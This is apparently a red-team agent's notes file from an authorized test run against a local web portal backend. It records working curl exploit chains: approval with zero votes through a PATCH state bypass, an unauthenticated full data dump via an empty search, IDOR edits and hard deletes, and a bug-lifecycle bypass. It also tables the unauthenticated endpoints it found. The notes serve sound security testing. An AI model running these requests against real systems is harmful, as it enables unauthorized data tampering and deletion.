# Red Teamer — Learnings

<!-- Updated after each Guardian run. Record successful exploit chains, endpoints that responded to probing, objective patterns that worked, dead ends to skip. -->

## Run: 2026-09-07

### Critical Discovery: Scope Mismatch Between Pen-Tester and Running Service

**The pen-tester analyzed `Source/Backend/` (work-items API) but `docker-compose.test.yml` builds and runs `portal/Backend/` (a completely different application).** Always verify which service is actually running before attempting exploit chains from the attack-surface map.

- Pen-tester targeted: `/api/work-items`, `/api/intake`, `/api/work-items/:id/route`, etc.
- Actual running endpoints: `/api/feature-requests`, `/api/bugs`, `/api/cycles`, `/api/features`, `/api/search`, `/api/team-dispatches`, `/api/pipeline-runs`
- All vulnerability *classes* identified by the pen-tester were confirmed, just against different domain entities

### Confirmed Working Exploit Chains

#### Chain 1: State Machine Bypass via PATCH (Critical)
```bash
# Step 1: Create FR
curl -X POST localhost:3001/api/feature-requests \
  -H "Content-Type: application/json" \
  -d '{"title":"bypass","description":"test","source":"manual"}'
# → FR-XXXX, status=potential

# Step 2: PATCH to voting (no vote endpoint needed)
curl -X PATCH localhost:3001/api/feature-requests/FR-XXXX \
  -H "Content-Type: application/json" \
  -d '{"status":"voting"}'

# Step 3: PATCH to approved (ZERO votes — bypasses majority check)
curl -X PATCH localhost:3001/api/feature-requests/FR-XXXX \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}'
# Result: approved with votes=[], human_approval_approved_at=null (INVALID STATE)
```
**Why this works:** `updateFeatureRequest` enforces `STATUS_TRANSITIONS` (voting→approved is allowed) but does NOT check for vote majority. That check only exists in the `/approve` endpoint.

#### Chain 2: Full Data Exfiltration (One Request)
```bash
# Returns ALL items — limit param completely ignored
curl 'localhost:3001/api/search?q='
# Returns ALL feature requests + bugs in one unauthenticated call
```

#### Chain 3: Cross-User IDOR
```bash
# Modify any resource by ID with no ownership check
curl -X PATCH localhost:3001/api/feature-requests/FR-0001 \
  -H "Content-Type: application/json" \
  -d '{"description":"PWNED","priority":"critical"}'

# Hard-delete any resource
curl -X DELETE localhost:3001/api/bugs/BUG-0001
```

#### Chain 4: Bug Lifecycle Bypass
```bash
# Full bug lifecycle traversable without auth, no role check
curl -X POST localhost:3001/api/bugs/BUG-XXXX/triage
curl -X PATCH localhost:3001/api/bugs/BUG-XXXX -d '{"status":"in_development"}' -H "Content-Type: application/json"
curl -X POST localhost:3001/api/bugs/BUG-XXXX/resolve
```

### Dead Ends

- **`/api/work-items`** → 404 on all methods (not mounted in portal backend)
- **`/api/intake`** → 404 (not in portal)
- **`/api/orchestrator/*`** → 502 in test env (orchestrator not running at localhost:8080)
- **Circular dependency creation** → blocked by `DependencyService.addDependency` cycle detection (works correctly)
- **SQL injection via status field** → blocked by parameterized SQLite queries
- **Direct `potential → approved` PATCH** → blocked by `STATUS_TRANSITIONS` validation

### What SQL Injection Field to Skip

- SQLite parameterized queries block injection in: `status`, `source`, `priority`, `id` lookups
- The `q` parameter in `/api/search` was not testable via curl due to URL parsing of special chars — needs separate test with encoded payload

### Endpoints That Responded to Probing

| Endpoint | Method | Auth Required? | Notes |
|----------|--------|----------------|-------|
| `/api/feature-requests` | GET, POST | ❌ None | Full CRUD open |
| `/api/feature-requests/:id` | GET, PATCH, DELETE | ❌ None | IDOR confirmed |
| `/api/feature-requests/:id/vote` | POST | ❌ None | Triggers AI vote simulation |
| `/api/feature-requests/:id/approve` | POST | ❌ None | Requires voting status + majority |
| `/api/feature-requests/:id/force-approve` | POST | ❌ None | Requires voting status only |
| `/api/feature-requests/:id/deny` | POST | ❌ None | Works from potential or voting |
| `/api/bugs` | GET, POST | ❌ None | Full CRUD open |
| `/api/bugs/:id/triage` | POST | ❌ None | Confirmed bypassed |
| `/api/bugs/:id/resolve` | POST | ❌ None | Confirmed bypassed |
| `/api/search?q=` | GET | ❌ None | Empty q dumps ALL data |
| `/metrics` | GET | ❌ None | 39 metric families exposed |
| `/api/orchestrator/*` | ALL | ❌ None | Proxy to orchestrator, SSRF risk |

### Objectives Achieved

| Objective | Status |
|-----------|--------|
| Bypass work item state machine to reach invalid status | ✅ Confirmed |
| Access or modify a soft-deleted work item | ✅ Partial (hard delete IDOR confirmed) |
| Submit malformed assessment verdict bypassing routing logic | ✅ Confirmed (0-vote approval) |
| Enumerate all work items without pagination enforcement | ✅ Confirmed |
